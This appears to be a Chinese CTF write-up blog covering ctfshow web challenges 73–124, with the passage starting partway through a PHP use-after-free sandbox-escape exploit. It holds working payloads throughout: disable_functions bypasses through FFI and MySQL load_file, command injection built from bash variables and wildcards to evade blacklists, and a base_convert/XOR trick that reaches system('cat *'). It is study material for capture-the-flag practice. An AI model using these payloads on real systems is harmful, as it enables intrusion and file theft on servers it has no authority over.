    if (strlen($abc) == 79 || strlen($abc) == 0) {
        die("UAF failed");
    }

    $closure_handlers = str2ptr($abc, 0);
    $php_heap = str2ptr($abc, 0x58);
    $abc_addr = $php_heap - 0xc8;

    write($abc, 0x60, 2);
    write($abc, 0x70, 6);
    write($abc, 0x10, $abc_addr + 0x60);
    write($abc, 0x18, 0xa);

    $closure_obj = str2ptr($abc, 0x20);
    $binary_leak = leak($closure_handlers, 8);

    if (!($base = get_binary_base($binary_leak))) {
        die("Couldn't determine binary base address");
    }

    if (!($elf = parse_elf($base))) {
        die("Couldn't parse ELF header");
    }

    if (!($basic_funcs = get_basic_funcs($base, $elf))) {
        die("Couldn't get basic_functions address");
    }

    if (!($zif_system = get_system($basic_funcs))) {
        die("Couldn't get zif_system address");
    }

    $fake_obj_offset = 0xd0;
    for ($i = 0; $i < 0x110; $i += 8) {
        write($abc, $fake_obj_offset + $i, leak($closure_obj, $i));
    }

    write($abc, 0x20, $abc_addr + $fake_obj_offset);
    write($abc, 0xd0 + 0x38, 1, 4);
    write($abc, 0xd0 + 0x68, $zif_system);

    ($helper->b)($cmd);
    exit();
}

ctfshow("cat /flag0.txt");    #在这里修改flag文件名
ob_end_flush();
```

&nbsp;

---

# web73

&nbsp;

**==题解一==**

**查看根目录文件**

```bash
c=var_export(scandir("/"));exit();
c=$a=opendir("/");while(($b = readdir())!==false){echo $b." ";}exit();
c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString()." ");}exit();

c=$a=new DirectoryIterator("glob:///*.txt");foreach($a as $f){echo($f->__toString()." ");}exit();  #这个直接会回显出flag的文件名
```

**flag文件名是 `flagc.txt` ，输出flag**

```bash
c=include("/flagc.txt");exit();
c=require("/flagc.txt");exit();
```

&nbsp;

**==题解二==**

**post**

```bash
c=include($_GET[a]);exit();
```

**GET**

```bash
?a=php://filter/convert.base64-encode/resource=/flagc.txt
```

&nbsp;

---

# web74

**`scandir` 被禁用了**

**==题解一==**

**查看根目录文件**

```bash
c=$a=opendir("/");while(($b = readdir())!==false){echo $b." ";}exit();
c=$a=new DirectoryIterator("glob:///*");foreach($a as $f){echo($f->__toString()." ");}exit();

c=$a=new DirectoryIterator("glob:///*.txt");foreach($a as $f){echo($f->__toString()." ");}exit();  #这个直接会回显出flag的文件名
```

**flag文件名是 `flagx.txt` ，输出flag**

```bash
c=include("/flagx.txt");exit();
c=require("/flagx.txt");exit();
```

&nbsp;

**==题解二==**

**（要先扫根目录）post**

```bash
c=include($_GET[a]);exit();
```

**GET**

```bash
?a=php://filter/convert.base64-encode/resource=/flagx.txt
```

&nbsp;

---

# web75

**查看根目录下文件（`scandir`  `opendir` 不能用了）**

```bash
c=$a=new DirectoryIterator("glob:///*");foreach($a as $b){echo ($b->__toString()." ");}exit();
```

**这道题 `include` `require` 都不能用了**

&nbsp;

**利用 `mysql` 的 `load_file()` 来查看文件**

**用 `mysql` 做，post `c=脚本`**

```mysql
try{
    $db = new PDO("mysql:host=localhost;dbname=ctftraining","root","root");
    foreach($db->query('select load_file("/flag36.txt")') as $row)/*这里修改flag文件名*/ 
    {
        echo ($row[0])."|";
    }
    $db = null;
}
catch(PDOException $e)
{
    echo $e->getMessage();
    exit(0);
}
exit(0);
```

<img src="\images\article_images\image-20250504201927786.png" alt="image-20250504201927786" style="zoom: 33%;" />

&nbsp;

---

# web76

**`opendir()` 无法使用**

&nbsp;

**查看根目录下文件**

```bash
c=var_export(scandir("glob:///*"));exit(0);
c=$a=new DirectoryIterator("glob:///*");foreach($a as $b){echo ($b-> __toString()." ");}exit();
```

<img src="\images\article_images\image-20250504203612083.png" alt="image-20250504203612083" style="zoom:33%;" />

&nbsp;

**flag文件名为 `flag36d.txt`**

&nbsp;

**利用mysql的 `load_file()` 来查看文件**

**脚本**

```mysql
try{
    $db = new PDO("mysql:host=localhost;dbname=ctftraining","root","root");
    foreach($db->query('select load_file("/flag36d.txt")') as $row)/*这里修改flag文件名*/ 
    {
        echo ($row[0])."|";
    }
    $db = null;
}
catch(PDOException $e)
{
    echo $e->getMessage();
    exit(0);
}
exit(0);
```

<img src="\images\article_images\image-20250504203835884.png" alt="image-20250504203835884" style="zoom: 25%;" />

&nbsp;

---

# web77

**查看根目录下文件（ `opendir()` 无法使用）**

```bash
c=var_export(scandir("glob:///*"));exit(0);
c=$a=new DirectoryIterator("glob:///*");foreach($a as $b){echo ($b-> __toString()." ");}exit();
```

<img src="\images\article_images\image-20250504210847548.png" alt="image-20250504210847548" style="zoom:80%;" />

**flag文件名为 `flag36x.txt`**

&nbsp;

**再次使用上一题的脚本发现无法得到flag**

<img src="\images\article_images\image-20250504210940389.png" alt="image-20250504210940389" style="zoom: 25%;" />

&nbsp;

**因为不能回显，所以利用重定向将 `readflag`内容输出到其他地方**

```php
c=$ffi=FFI::cdef("int system(const char *system);", "libc.so.6");
$a="/readflag > flag2.txt";   /*这里修改要输出的文件名*/
$ffi->system($a);
exit();
```

**之后访问 `/flag2.txt`**

<img src="\images\article_images\image-20250504211340151.png" alt="image-20250504211340151" style="zoom:80%;" />

&nbsp;

> **这个解法是一个利用 PHP 的 FFI 技术（Foreign Function Interface） 来调用底层 C 标准库函数 `system()` 的 命令执行漏洞利用技巧，结合参数注入直接拿到服务器上的 `flag` 文件。**

```php
解析

c=$ffi=FFI::cdef("int system(const char *system);", "libc.so.6");
/*
告诉 PHP：
"我想用 libc 这个 C 标准库里的 system 函数，它长这样：int system(const char *cmd);这样，PHP 就为你加载了一个 system() 的函数，叫 $ffi->system()，可以直接用了
*/


$a="/readflag > flag2.txt";
/* 
/readflag 是CTF靶机提供的一个程序，作用就是 输出 flag
> 是 shell 的重定向符号，意思是：把执行结果写入某个文件
所以这个命令执行后，服务器上就会出现一个新文件：flag2.txt，里面就是 flag 内容*/

$ffi->system($a);
/*让服务器执行 /readflag，并把 flag 写进 flag2.txt 文件*/

exit();
/*直接退出，防止执行后续的 PHP 代码*/
```



---

# web118

<img src="\images\article_images\image-20250505115731893.png" alt="image-20250505115731893" style="zoom:25%;" />

&nbsp;

**题目给的提示：**

<img src="\images\article_images\image-20250505125557509.png" alt="image-20250505125557509" style="zoom:80%;" />

**由题目知 `flag`位于 `flag.php`**

&nbsp;

**查看源代码，知道从输入框 `输入的内容` 就成了 `system` 命令里所谓的 `$code`**

<img src="\images\article_images\image-20250505115856799.png" alt="image-20250505115856799" style="zoom: 50%;" />

&nbsp;

**尝试输入，发现有一些输入会回显 `evil input`，存在过滤**

**抓包，尝试找到 被过滤/没被过滤 的字符**

<img src="\images\article_images\image-20250505113126311.png" alt="image-20250505113126311" style="zoom:80%;" />

<img src="\images\article_images\image-20250505112942944.png" alt="image-20250505112942944" style="zoom:80%;" />

**很明显，大写字母 和 `#` `$` `.` `;` `?` `@` `_` `{` `}` `~` 没有被过滤**

**小写字母和数字都被过滤了**

&nbsp;

**不管怎样，我们最终的目的是不变的，就是要想办法构造一个命令，能达到 `tac flag.php` 的效果**

**首先看看这些  利用bash内置变量**

<img src="\images\article_images\image-20250505114504396.png" alt="image-20250505114504396" style="zoom:50%;" />

&nbsp;

```bash
#PWD：输出当前所在路径
user@LAPTOP-HHK0H1KL:~$ echo ${PWD}
/home/user

#从下标1开始，截取长度为3位的字符
user@LAPTOP-HHK0H1KL:~$ echo ${PWD:1:3}
hom

#从下标3后面开始输出字符
user@LAPTOP-HHK0H1KL:~$ echo ${PWD:3}
me/user

#从下标4后面开始输出字符
user@LAPTOP-HHK0H1KL:~$ echo ${PWD:4}
e/user

#从下标5后面开始输出字符
user@LAPTOP-HHK0H1KL:~$ echo ${PWD:5}
/user

#说明字母和数字0的作用一样
user@LAPTOP-HHK0H1KL:~$ echo ${PWD:A}
/home/user

#说明字母和数字0的作用一样
user@LAPTOP-HHK0H1KL:~$ echo ${PWD:B}
/home/user

#说明字母和数字0的作用一样
user@LAPTOP-HHK0H1KL:~$ echo ${PWD:G}
/home/user

#取反号~：输出最后1个字符
user@LAPTOP-HHK0H1KL:~$ echo ${PWD:~0}
r

#说明字母和数字0的作用一样
user@LAPTOP-HHK0H1KL:~$ echo ${PWD:~J}
r

#输出可执行程序搜索路径
user@LAPTOP-HHK0H1KL:~$ echo ${PATH}
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

**要利用这种方法构造出想要的命令，肯定要求我们的命令简洁简短，这样容易构造，因为条件有限**

**比如对于 `cat`、`tac`、`more`、`less`、`head`、`tail`、`nl`、`sed`、`sort`、`uniq`、`rev`，这些命令，我们肯定要选 `nl` ，不妨看看上面指令 `echo ${PATH}` ，输出内容中的最后一个字符就是 `n` ，那么利用 `echo ${PWD:A}` 就很容易构造出来 `n`**

&nbsp;

**于是，我们目标明确，利用内置变量，构造出命令 `nl flag.php`**

**根据题目给的这张图，当前目录 `/var/www/html` ，目录的最后一个字母是 `l`**

<img src="\images\article_images\image-20250505125629736.png" alt="image-20250505125629736" style="zoom:25%;" />

&nbsp;

**所以，`${PATH:~A}${PWD:~A}` 等价于 `nl`**

**空格和小写字母被过滤，用 `${IFS}` 和 通配符 `?` 代替**

&nbsp;

**`${PATH:~A}${PWD:~A}${IFS}????.???`**

**等价于     `${PATH:~0}${PWD:~0} ????.??? `**

**等价于     `nl flag.php`** 

&nbsp;

**payload**

```shell
#nl flag.php
#nl ????.???
${PATH:~A}${PWD:~A}${IFS}????.???
```

<img src="\images\article_images\image-20250505131213077.png" alt="image-20250505131213077" style="zoom:33%;" />

&nbsp;



**其他payload**

&nbsp;

```bash
#输出可执行程序搜索路径
user@LAPTOP-HHK0H1KL:~$ echo ${PATH}
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

# ${#}是0
user@LAPTOP-HHK0H1KL:~$ echo ${#}
0

# SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开 shell 时 ${SHLVL}=1
#然后在此 shell 中再打开一个 shell 时 ${SHLVL}=2
user@LAPTOP-HHK0H1KL:~$ echo ${SHLVL}
1

user@LAPTOP-HHK0H1KL:~$ echo ${SHLVL}
1

#输出当前目录
user@LAPTOP-HHK0H1KL:~$ echo ${PWD}
/home/user

# ${#PWD}是回显字符数
user@LAPTOP-HHK0H1KL:~$ echo ${#PWD}
10

#等价与 echo ${PWD:0:1} ,即 /
user@LAPTOP-HHK0H1KL:~$ echo ${PWD:${#}:${SHLVL}}
/

# ${RANDOM}一般是一个4~5位的随机数
user@LAPTOP-HHK0H1KL:~$ echo ${RANDOM}
1998

user@LAPTOP-HHK0H1KL:~$ echo ${RANDOM}
30785

user@LAPTOP-HHK0H1KL:~$ echo ${HOME}
/home/user

# 因此 ${#RANDOM}一般是4/5
user@LAPTOP-HHK0H1KL:~$ echo ${#RANDOM}
4

user@LAPTOP-HHK0H1KL:~$ echo ${#RANDOM}
5

# TERM 是一个环境变量，表示当前终端类型常见值有：xterm、xterm-256color、linux、screen、dumb
user@LAPTOP-HHK0H1KL:~$ echo ${TERM}
xterm-256color

#取字符串长度
user@LAPTOP-HHK0H1KL:~$ echo ${#TERM}
14

#输出可执行程序搜索路径(为了方便看，不用往上翻)
user@LAPTOP-HHK0H1KL:~$ echo ${PATH}
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

&nbsp;

```bash
# (根据题目给的payload反向推理) 题目附件的网址 "yu-love" 合理推测这道题靶机的输出
yu-love@LAPTOP-HHK0H1KL:~$ echo ${HOME}
/home/yu-love

#取字符串长度
yu-love@LAPTOP-HHK0H1KL:~$ echo ${#HOME}
13

# 根据其他payload 合理推测这道题靶机输出的是dumb
yu-love@LAPTOP-HHK0H1KL:~$ echo ${TERM}
dumb

#取字符串长度
yu-love@LAPTOP-HHK0H1KL:~$ echo ${#TERM}
4
```

&nbsp;

**(其实本质上都是构造 `nl flag.php`)**

**构造 `nl ?l??.???`**

**`${PATH:13:1}${PATH:4:1} ?${PATH:4:1}??.???`**

**等价于**

```bash
${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.???
```

**但是由于这里用了 `RANDOM`，所以需要多试几次**

**(而且这里的空格不用换成 `${IFS}` 也可以过！！)**

**payload**

```bash
#nl flag.php
#nl ?l??.???
${PATH:${#HOME}:${#SHLVL}}${PATH:${#RANDOM}:${#SHLVL}} ?${PATH:${#RANDOM}:${#SHLVL}}??.???
```

&nbsp;

---

# web119

**测试后发现，在上一题的基础上过滤了 `PATH`**

&nbsp;

**此时要想构造 `nl` 就比较难了，尝试用 `/bin/base64`**

**目标：构造 `/bin/base64 flag.php` 即 `/???/?????4 ????.???`**

&nbsp;

**于是，剩下的工作就是利用内置变量替换 `/` 和`4`**

```bash
#输出可执行程序搜索路径  （靶机的 路径）
user@LAPTOP-HHK0H1KL:~$ echo ${PWD}
/var/www/html
```

**目标：**

```bash
${PWD:0:1}???${PWD:0:1}?????${#RANDOM} ????.???
```

**—>**

```bash
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}?????${#RANDOM} ????.???
```

&nbsp;

**最终的payload （由于使用了 `RANDOM` ，所以需要多试几次）**   

```bash
#/bin/base64 flag.php
#/???/?????4 ????.???
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?????${#RANDOM} ????.???

${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???

${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???
(${##}=1)
```

<img src="\images\article_images\image-20250505154315931.png" alt="image-20250505154315931" style="zoom: 25%;" />

&nbsp;

<img src="\images\article_images\image-20250505154301006.png" alt="image-20250505154301006" style="zoom:33%;" />

&nbsp;

**其他payload**

```bash
其他 bash 内置变量
${USER} : www-data
${#IFS} : 3    //# 是 Bash 的字符串长度运算符。
${#}    : 0
${##}   : 1
${###}  : 0
${####} : 0
```

&nbsp;

**可以尝试 `/bin/cat flag.php`**

**这里 php版本是 7.3.22 ，可以利用 `${PHP_VERSION:~A}  ` 获取 数字 `2`**

<img src="\images\article_images\image-20250505155320158.png" alt="image-20250505155320158" style="zoom:33%;" />

```
/bin/cat flag.php

—> /???/?at flag.php

(或者：/???/?a? flag.php     PS:这个    乱码>___<         乱码>___<)



—> ${PWD:0:1}???${PWD:0:1}?${USER:~2:2} ????.???

(或者：${PWD:0:1}???${PWD:0:1}?${USER:~0}? ????.???   PS:这个乱码>___<)



—> ${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} ????.???

(或者：${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~A}? ????.???     PS:这个乱码>___<       乱码>___<)
```

&nbsp;



```bash
#/bin/cat flag.php
#/???/?at flag.php
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} ????.???

${PWD:${#}:${##}}???${PWD:${#}:${##}}?${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} ????.???

${PWD::${##}}???${PWD::${##}}?${USER:~${PHP_VERSION:~A}:${PHP_VERSION:~A}} ????.???

#/bin/cat flag.php
#/???/?a? flag.php
#这个出来乱码>___<   乱码>___<    乱码>___<   乱码>___<
${PWD:${#}:${#SHLVL}}???${PWD:${#}:${#SHLVL}}?${USER:~A}? ????.???

${PWD:${#}:${##}}???${PWD:${#}:${##}}?${USER:~A}? ????.???

${PWD::${##}}???${PWD::${##}}?${USER:~A}? ????.???

#/bin/rev flag.php
#/???/r?? ????.???
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}${PWD:${#IFS}:${#SHLVL}}?? ????.???

${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.???

${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???
```

&nbsp;

---

# web120

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|PATH|BASH|HOME|\/|\(|\)|\[|\]|\\\\|\+|\-|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

?>
```

**给黑名单了！同时有限制长度**

&nbsp;

**payload**

```bash
#/bin/base64 flag.php
#/???/?????4 flag.php
${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???
${PWD::${#SHLVL}}???${PWD::${#SHLVL}}?????${#RANDOM} ????.???

#/bin/rev flag.php
#/???/r?? ????.???
${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.???
${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???
```

<img src="\images\article_images\image-20250505162457958.png" alt="image-20250505162457958" style="zoom: 25%;" />

&nbsp;

---

# web121

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\<|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

?>
```

**与上一题相比，只有我们用到的 `SHLVL` 被过滤了（上一题也可以不用 `SHLVL`）**

&nbsp;

```bash
一些 bash 内置变量
${#}=0
${##}=1
${#?}=1  //$?表示上一个命令的退出码（成功 = 0，失败 = 1，命令未找到 = 127，权限问题 = 126）
		 //${#?}表示取长度 若上一条命令成功，则${#?}相当于${#0}=1
${#??}=0 //视??为变量名，然而 ?? 变量不存在 → 值为空 → 长度是 0
```

**payload**

```bash
#/bin/base64 flag.php
#/???/?????4 flag.php
${PWD::${##}}???${PWD::${##}}?????${#RANDOM} ????.???

${PWD::${#?}}???${PWD::${#?}}?????${#RANDOM} ????.???


#/bin/rev flag.php
#/???/r?? ????.???
${PWD::${##}}???${PWD::${##}}${PWD:${#IFS}:${##}}?? ????.???

${PWD::${#?}}???${PWD::${#?}}${PWD:${#IFS}:${#?}}?? ????.???
```

&nbsp;

<img src="\images\article_images\image-20250505165849611.png" alt="image-20250505165849611" style="zoom: 33%;" />

&nbsp;

---

# web122

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['code'])){
    $code=$_POST['code'];
    if(!preg_match('/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\>|\'|\"|\`|\||\,/', $code)){    
        if(strlen($code)>65){
            echo '<div align="center">'.'you are so long , I dont like '.'</div>';
        }
        else{
        echo '<div align="center">'.system($code).'</div>';
        }
    }
    else{
     echo '<div align="center">evil input</div>';
    }
}

?>
```

**过滤了 `PWD`、`#`、`USER`，白名单了 `HOME`**

&nbsp;

**`$?` 表示上一条命令执行结束后的传回值。通常 `0`  代表执行成功，`非0 ` 代表执行有误**

&nbsp;

**几种报错及对应的返回值**

```bash
"OS error code   1:  Operation not permitted"
"OS error code   2:  No such file or directory"
"OS error code   3:  No such process"
"OS error code   4:  Interrupted system call"
"OS error code   5:  Input/output error"
"OS error code   6:  No such device or address"
"OS error code   7:  Argument list too long"
"OS error code   8:  Exec format error"
"OS error code   9:  Bad file descriptor"
"OS error code  10:  No child processes"
```

**（所以利用 `<A` 的报错就能返回值1）**

&nbsp;

<img src="\images\article_images\image-20250505173823524.png" alt="image-20250505173823524" style="zoom:50%;" />

```bash
#将A文件夹内的命令重定向到终端进行执行，由于没有文件A，所以报错1
user@LAPTOP-HHK0H1KL:~$ <A
-bash: A: No such file or directory

#执行 <A 等命令会因找不到目录或者文件执行失败
user@LAPTOP-HHK0H1KL:~$ $?
1: command not found

#执行一个正确的命令
user@LAPTOP-HHK0H1KL:~$ echo hello
hello

#返回0，说明上面的命令执行成功
user@LAPTOP-HHK0H1KL:~$ $?
0: command not found
```

&nbsp;

```bash
目标：构造 /bin/base64 flag.php
----->   /???/?????4 ????.???
----->   <A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
```

**payload  （由于使用 `RANDOM` ，一定要多试几次）**

```bash
<A;${HOME::$?}???${HOME::$?}?????${RANDOM::$?} ????.???
<A;${HOME:${A}:$?}???${HOME:${A}:$?}?????${RANDOM::$?} ????.???
```

&nbsp;

<img src="\images\article_images\image-20250505175440431.png" alt="image-20250505175440431" style="zoom: 25%;" />

&nbsp;

---

# web124

```php
<?php

/*
# -*- coding: utf-8 -*-
# @Author: 收集自网络
# @Date:   2020-09-16 11:25:09
# @Last Modified by:   h1xa
# @Last Modified time: 2020-10-06 14:04:45

*/

error_reporting(0);
//听说你很喜欢数学，不知道你是否爱它胜过爱flag
if(!isset($_GET['c'])){
    show_source(__FILE__);
}else{
    //例子 c=20-1
    $content = $_GET['c'];
    if (strlen($content) >= 80) {
        die("太长了不会算");
    }
    $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
    foreach ($blacklist as $blackitem) {
        if (preg_match('/' . $blackitem . '/m', $content)) {
            die("请不要输入奇奇怪怪的字符");
        }
    }
    //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
    foreach ($used_funcs[0] as $func) {
        if (!in_array($func, $whitelist)) {
            die("请不要输入奇奇怪怪的函数");
        }
    }
    //帮你算出答案
    eval('echo '.$content.';');
}
```

**get 传参 c ，长度限制 80 ，有黑白名单**

**简而言之，要求你构造一个使用白名单函数，又不包括黑名单符号的 payload 来命令执行**

**白名单中数学函数分两种利用方法，==进制转换== 和 ==异或==，旨在调用能返回字符串的数学函数达到命令执行的目的。**

&nbsp;



**==题解一==**

```shell
base_convert(number,frombase,tobase);

number	    必需。规定要转换的数。
frombase	必需。规定数字原来的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z               表示，例如 a 表示 10，b 表示 11 以及 z 表示 35。
tobase	    必需。规定要转换的进制。介于 2 和 36 之间（包括 2 和 36）。高于十进制的数字用字母 a-z 表             示，例如 a 表示 10，b 表示 11 以及 z 表示 35。

bindec — 二进制转换为十进制
bindec ( string $binary_string ) : number

decbin — 十进制转换为二进制
decbin ( int $number ) : string

dechex — 十进制转换为十六进制
dechex ( int $number ) : string
#把十进制转换为十六进制。返回一个字符串，包含有给定 binary_string 参数的十六进制表示。所能转换的最大数值为十进制的 4294967295，其结果为 “ffffffff”。

decoct — 十进制转换为八进制
decoct ( int $number ) : string

hexdec — 十六进制转换为十进制
hexdec ( int $number ) : string
#把十六进制转换为十进制。返回与 hex_string 参数所表示的十六进制数等值的的十进制数
```

&nbsp;

**十六进制的字母范围只有 a-f ，显然是不符合我们构造的要求，而三十六进制字母范围正好为 a-z 。**

**并且 `base_convert` 正好能在任意进制转换数字，这样我们传入十进制的数字，使其转换为三十六进制时，返回的字符串是我们想要的 `cat` 等命令。**

**例如：**

```php
base_convert("cat",36,10);
//15941
```

**这里，虽然可以构造纯字母字符串了，但进制转换显然不能返回  `.`  `/`  `*`  等特殊字符，而这就需要用到另一类运算函数。**

&nbsp;

**如下**

>  **php异或**

**php 中异或运算符 `^` 是位运算符**

- **如果进行运算的都是数字，会先转换为二进制，再进行按位异或**

```shell
(0 = 0000) ^ (5=0101) = (5=0101)
(1 = 0001) ^ (5=0101) = (4=0100)
(2 = 0010) ^ (5=0101) = (7=0111)
```

**例如**

```php
echo 12^9
//5
```

- **如果进行运算的含有字符串**

**长度一致时，先把字符串 按位转换 为 `ascii 码`，再将 `ascii 码` 转换为 `二进制 `进行按位异或，最后输出 ascii 为异或结果的字符。**

**长度不一致时，按 最短 的字符串长度 按位异或**

```php
echo "12" ^ "9";

#"12"是两个字符，ASCII码分别是 '1' = 49, '2' = 50
#"9" 是一个字符，ASCII码 '9' = 57
#'1' ^ '9' = 49 ^ 57 = 00110001 ^ 00111001= 8 → ASCII #8（Backspace）
#输出是非可见字符，所以看到的一些奇怪的结果或看不到
```

```php
echo "hallo" ^ "hello;"
    
#位置	字符1	 字符2 	ASCII1	ASCII2	 异或结果	ASCII
#1		h	 h		104		104			0		\0
#2		a	 e		97		101			4		\x04
#3		l	 l		108		108			0		\0
#4		l	 l		108		108			0		\0
#5		o	 o		111		111			0		\0
#输出是：\x00\x04\x00\x00\x00 —— 不是可读字符。
```

```php
echo 2 ^ "3"; 
#2 是整数
#"3" 是字符串，但会转成数字 3
#所以 2 ^ 3 = 1
```

```php
echo "2" ^ 3;
#"2" 转成整数 2
#3 是整数
#结果也是 2 ^ 3 = 1
```

> **按位异或运算的几个性质：**
>
> 1. **结合律a ^ b ^ c = a ^ c ^ b**
>
> 2. **交换律a ^ b = b ^ a**
>
> 3. **数值交换（能交换 a 与 b 的值）a = a ^ b;           b = a ^ b;          a = a ^ b;**
>
>    ​                                                       **temp = a ^ b;   a = temp ^ a;   b = temp ^ b;**

&nbsp;

**假设初始：**

```php
a = A
b = B
```

**执行：**

```php
a = a ^ b;  // a = A ^ B
b = a ^ b;  // b = (A ^ B) ^ B = A ^ (B ^ B) = A ^ 0 = A
a = a ^ b;  // a = (A ^ B) ^ A = (A ^ A) ^ B = 0 ^ B = B
```

**交换完成后：**

```php
a = B
b = A
```

&nbsp;

**接下来就是利用异或 构造例如 `   空格* ` 这样的特殊字符**

**由上面的性质  ，`"a"^"a"` 的结果很明显，相同即 0 ，也就是说，`"a"^"a"`  的结果 ascii 全 0**

**而 `ascii 全 0` 与 `另一位` 进行 按位异或，得到结果就正是 `另一位` 的 `ascii 码`**

**换言之，`"a"^"x"^"a"` 无论怎么调换顺序，输出的都是 `x` 的 `ascii 码 120` ， `x` 被替换为什么，结果就是所替换的那个字符的 `ascii码`。**

**如果`k` ^ `i` ^ `空格*` = `某`**

**则有`k` ^ `i` ^ `某` = `空格*`**

&nbsp;

**于是我们可以在白名单函数里面寻找 `k` 和 `i` ，使 `k` 和 `i` 能与 `空格*` 异或得到 `一个值`  （ 且这个值`能使用数学函数 dechex 得到`）**

**利用ctfshow_web124_1.php脚本爆破**

```php
<?php
$whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
$whitelist2 = [ 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh','abs'];

foreach ($whitelist as $i) {
    foreach ($whitelist2 as $k) {
        echo ($k ^ $i ^ " *") . "   $i $k\n";
    }
}
```

<img src="\images\article_images\image-20250505213848722.png" alt="image-20250505213848722" style="zoom:33%;" />

&nbsp;

**有很多符合条件的值**

**任取一例 `10^pi^asinh` 的结果为 `空格*`**

&nbsp;

**到这里一切都很明确了，目标：构造 `system('cat *')`**

**首先反向求解**

```php
echo base_convert("system",36,10);
//1751504350
echo base_convert("cat",36,10);
//15941
echo hexdec(10);
//16
```

**那么**

```php
#这些都是字符串拼接，不用考虑括号
echo base_convert(1751504350,10,36);
//system
echo base_convert(15941,10,36);
//cat
echo dechex(16);
//10
```

**payload**

```php
base_convert(1751504350,10,36)(base_convert(15941,10,36).(dechex(16)^asinh^pi))
```

<img src="\images\article_images\image-20250505212133503.png" alt="image-20250505212133503" style="zoom:80%;" />

&nbsp;

